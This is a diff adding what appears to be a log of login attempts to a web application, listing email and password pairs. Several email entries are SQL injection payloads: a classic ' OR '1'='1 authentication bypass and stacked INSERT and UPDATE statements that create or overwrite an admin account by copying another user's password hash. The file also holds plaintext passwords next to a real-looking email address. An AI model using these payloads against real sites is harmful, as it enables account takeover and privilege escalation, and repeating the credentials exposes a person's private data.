@@ -1,0 +1,73 @@
+
+
+Email: murashikandrusha@gmail.com
+Пароль: 111111
+
+Email: fedya@gmail.com
+Пароль: 111111
+
+Email: murashikandrusha@gmail.com
+Пароль: 111111
+
+Email: murashikandrusha@gmail.com
+Пароль: 123456
+
+Email: murashikandrusha@gmail.com
+Пароль: 123456
+
+Email: murashikandrusha@gmail.com
+Пароль: 123456
+
+Email: ' OR '1'='1
+
+Пароль: 111111
+
+Email: m@gmail.com
+Пароль: 111111
+
+Email: ' OR '1'='1
+Пароль: 111111
+
+Email: ' OR '1'='1
+Пароль: 111111
+
+Email: ' OR '1'='1
+Пароль: 111111
+
+Email: ' OR '1'='1
+Пароль: 111111
+
+Email: murashikandrusha@gmail.com'; INSERT INTO users (id, username, email, password, created_at, role, is_banned, avatar_path) 
+VALUES (60, 'hacker', 'hacker@example.com', (SELECT password FROM users WHERE id = 33), NOW(), 'admin', 0, NULL); --
+
+Пароль: 111111
+
+Email: murashikandrusha@gmail.com'; INSERT INTO users (id, username, email, password, created_at, role, is_banned, avatar_path) 
+VALUES (60, 'hacker', 'hacker@example.com', (SELECT password FROM users WHERE id = 33), NOW(), 'admin', 0, NULL); --
+
+Пароль: 111111
+
+Email: test@example.com' INSERT INTO users (id, username, email, password, created_at, role, is_banned, avatar_path) 
+VALUES (60, 'hacker', 'hacker@example.com', (SELECT password FROM users WHERE id = 33), NOW(), 'admin', 0, NULL) --
+
+Пароль: 12345
+
+Email: test@example.com'; INSERT INTO users (id, username, email, password, created_at, role, is_banned, avatar_path) 
+VALUES (60, 'hacker', 'hacker@example.com', (SELECT password FROM users WHERE id = 33), NOW(), 'admin', 0, NULL); --
+
+Пароль: 123456
+
+Email: test@example.com'; UPDATE users 
+SET username = 'hacker', email = 'hacker@example.com', 
+password = (SELECT password FROM users WHERE id = 33), 
+role = 'admin', is_banned = 0, avatar_path = NULL 
+WHERE id = 50; --
+
+Пароль: 1123345
+
+Email: 
+test@example.com'; INSERT INTO users (id, username, email, password, created_at, role, is_banned, avatar_path) 
+VALUES (60, 'hacker', 'hacker@example.com', '$2y$10$8zmoI.kfcqg9xwtotewXMufZstNbw7r9K9uwzskMh79QSQcWduoyW', NOW(), 'admin', 0, NULL); --
+
+Пароль: 123456
+
